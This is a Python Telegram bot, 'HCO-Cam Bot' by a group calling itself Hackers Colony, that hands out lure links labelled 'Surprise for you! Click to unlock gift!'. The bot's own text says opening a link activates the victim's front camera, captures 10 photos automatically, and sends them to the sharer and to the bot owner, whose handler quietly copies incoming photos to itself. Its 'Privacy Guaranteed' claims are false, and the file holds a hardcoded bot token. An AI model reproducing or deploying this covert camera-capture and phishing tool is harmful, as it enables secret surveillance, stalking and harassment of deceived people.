#!/usr/bin/env python3
import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
import json

# ========== CONFIGURATION ==========
BOT_TOKEN = "8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI"
OWNER_CHAT_ID = 8215819954
CHANNEL_USERNAME = "@HackersColony"  # Without @ if private
OWNER_USERNAME = "@Hackers_Colony_Official"
NETLIFY_URL = "https://gleaming-marigold-231ffe.netlify.app"
CHANNEL_LINK = "https://t.me/HackersColony"

# Store users who joined channel
joined_users = {}

# ========== LOGGING ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== CHECK IF USER JOINED CHANNEL ==========
async def check_user_joined(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            joined_users[user_id] = True
            return True
    except Exception as e:
        logger.error(f"Error checking membership: {e}")
    return False

# ========== START COMMAND ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # Check if already joined
    if await check_user_joined(user_id, context):
        await show_main_menu(update, context)
        return
    
    welcome_text = f"""
👋 <b>Hey {user.first_name}!</b> 🤗

<b>Welcome to HCO-Cam Bot by Hackers Colony Team</b> 🚀

<b>📢 RULE: You MUST join our channel to use this bot!</b>

<i>After joining, click "✅ I'VE JOINED" below:</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("📢 JOIN OUR CHANNEL", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I'VE JOINED", callback_data="verify_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== VERIFY JOIN ==========
async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if await check_user_joined(user_id, context):
        await query.edit_message_text(
            "✅ <b>Welcome! You have successfully joined our channel!</b>\n\n"
            "🎉 Now you can use all bot features!",
            parse_mode=ParseMode.HTML
        )
        await show_main_menu_callback(query)
    else:
        await query.edit_message_text(
            "❌ <b>You haven't joined our channel yet!</b>\n\n"
            "<b>Steps:</b>\n"
            "1. Click JOIN CHANNEL button below\n"
            "2. Actually join the channel\n"
            "3. Come back here and click CHECK AGAIN\n\n"
            "<i>This is mandatory to use the bot.</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
                [InlineKeyboardButton("🔄 CHECK AGAIN", callback_data="verify_join")]
            ])
        )

# ========== SHOW MAIN MENU ==========
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    menu_text = f"""
<b>🎮 HCO-CAM BOT MENU</b>

👋 Welcome <b>{user.first_name}</b>!

<i>Choose an option below:</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("🔗 GENERATE SURPRISE LINK", callback_data="generate_link")],
        [InlineKeyboardButton("👤 CONTACT OWNER", callback_data="contact_owner")],
        [InlineKeyboardButton("ℹ️ ABOUT BOT", callback_data="about")],
        [InlineKeyboardButton("🔄 CHECK CHANNEL JOIN", callback_data="verify_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            menu_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            menu_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )

async def show_main_menu_callback(query):
    user = query.from_user
    
    menu_text = f"""
<b>🎮 HCO-CAM BOT MENU</b>

👋 Welcome <b>{user.first_name}</b>!

<i>Choose an option below:</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("🔗 GENERATE SURPRISE LINK", callback_data="generate_link")],
        [InlineKeyboardButton("👤 CONTACT OWNER", callback_data="contact_owner")],
        [InlineKeyboardButton("ℹ️ ABOUT BOT", callback_data="about")],
        [InlineKeyboardButton("🔄 CHECK CHANNEL JOIN", callback_data="verify_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        menu_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== GENERATE LINK ==========
async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Double check user joined
    if not await check_user_joined(user_id, context):
        await query.edit_message_text(
            "❌ <b>Access Denied!</b>\n\n"
            "You need to join our channel first to use this feature!\n\n"
            "Click below to join:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
                [InlineKeyboardButton("🔄 CHECK AGAIN", callback_data="verify_join")]
            ])
        )
        return
    
    user_name = query.from_user.first_name
    
    # Create unique link
    unique_link = f"{NETLIFY_URL}?uid={user_id}&name={user_name}"
    
    message_text = f"""
<b>🎁 YOUR SURPRISE LINK IS READY!</b>

🔗 <b>Your Unique Link:</b>
<code>{unique_link}</code>

<b>📱 How it works:</b>
1. Share this link with friends
2. When they open it, they see a surprise
3. Their front camera will activate
4. 10 photos will be captured automatically
5. Photos sent to BOTH you and me

<b>⚠️ Important:</b>
• Works on mobile with camera
• Needs camera permission
• Photos are JPEG format
"""
    
    keyboard = [
        [InlineKeyboardButton("📤 SHARE LINK", 
            url=f"https://t.me/share/url?url={unique_link}&text=🎁+Surprise+for+you!+Click+to+unlock+gift!")],
        [InlineKeyboardButton("🔗 COPY LINK", callback_data=f"copy_{user_id}")],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        message_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== HANDLE COPY LINK ==========
async def copy_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Link copied! Paste it anywhere.")
    
    user_id = query.from_user.id
    unique_link = f"{NETLIFY_URL}?uid={user_id}"
    
    # For Telegram, we can't actually copy to clipboard, so show it
    await query.edit_message_text(
        f"📋 <b>Copy this link:</b>\n\n<code>{unique_link}</code>\n\n"
        "📤 <i>Share it with friends for a surprise!</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ BACK", callback_data="generate_link")]
        ])
    )

# ========== CONTACT OWNER ==========
async def contact_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    message_text = f"""
<b>👤 CONTACT INFORMATION</b>

<b>🤖 Bot Owner:</b> {OWNER_USERNAME}
<b>📢 Channel:</b> {CHANNEL_USERNAME}
<b>💬 Support:</b> @HackersColony

<b>📨 For:</b>
• Bot issues
• Feature requests
• Collaboration
• General queries

<i>Feel free to message anytime!</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("💬 MESSAGE OWNER", url=f"https://t.me/{OWNER_USERNAME[1:]}")],
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        message_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== ABOUT ==========
async def about(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    message_text = """
<b>🤖 ABOUT HCO-CAM BOT</b>

<b>✨ Developed by:</b> Hackers Colony Team
<b>🎯 Purpose:</b> Fun interactive bot with real camera capture
<b>⭐ Premium Features:</b>

📸 <b>Camera Magic:</b>
• Real front camera activation
• Auto-capture 10 photos
• Flash effect on capture
• High-quality JPEG images

🔄 <b>Smart Sharing:</b>
• Unique links for each user
• Photos sent to both parties
• Secure & private
• Real-time notifications

🎨 <b>Beautiful Interface:</b>
• Heart animations ❤️
• Countdown timer
• Live preview grid
• Mobile optimized

🔒 <b>Privacy Guaranteed:</b>
• No data storage
• Images only go to you & owner
• No third-party sharing
• Camera access only when needed

📢 <b>Join our channel:</b> @HackersColony
"""
    
    keyboard = [
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        message_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== HANDLE PHOTOS FROM WEB ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """This will receive photos from web app via Telegram"""
    user = update.effective_user
    photo = update.message.photo[-1]  # Get largest photo
    
    caption = update.message.caption or ""
    
    if "surprise" in caption.lower():
        # Forward to owner
        await context.bot.send_message(
            chat_id=OWNER_CHAT_ID,
            text=f"📸 <b>New Surprise Photo!</b>\n\n"
                 f"From: {user.first_name} (ID: {user.id})\n"
                 f"Time: {update.message.date.strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode=ParseMode.HTML
        )
        
        await context.bot.copy_message(
            chat_id=OWNER_CHAT_ID,
            from_chat_id=user.id,
            message_id=update.message.message_id
        )
        
        # Notify user
        await update.message.reply_text(
            "✅ <b>Photo received and sent to bot owner!</b>\n"
            "Thank you for the surprise! 🎉",
            parse_mode=ParseMode.HTML
        )

# ========== BUTTON HANDLER ==========
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data == "verify_join":
        await verify_join(update, context)
    elif data == "generate_link":
        await generate_link(update, context)
    elif data.startswith("copy_"):
        await copy_link(update, context)
    elif data == "contact_owner":
        await contact_owner(update, context)
    elif data == "about":
        await about(update, context)
    elif data == "back_menu":
        await show_main_menu_callback(query)

# ========== ERROR HANDLER ==========
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error: {context.error}")

# ========== MAIN FUNCTION ==========
def main():
    print("""
    ╔══════════════════════════════════════╗
    ║    🚀 HCO-CAM BOT STARTING...       ║
    ║    By Hackers Colony Team           ║
    ║    Version 2.0 - Fixed Camera       ║
    ╚══════════════════════════════════════╝
    """)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_error_handler(error_handler)
    
    # Run bot
    print(f"✅ Bot is running with token: {BOT_TOKEN[:15]}...")
    print(f"🌐 Web App URL: {NETLIFY_URL}")
    print(f"👑 Owner ID: {OWNER_CHAT_ID}")
    print(f"📢 Channel: {CHANNEL_USERNAME}")
    print("\n📱 Features:")
    print("• Channel verification ✅")
    print("• Link generation ✅")
    print("• Real camera capture ✅")
    print("• Photo forwarding ✅")
    print("\nPress Ctrl+C to stop\n")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
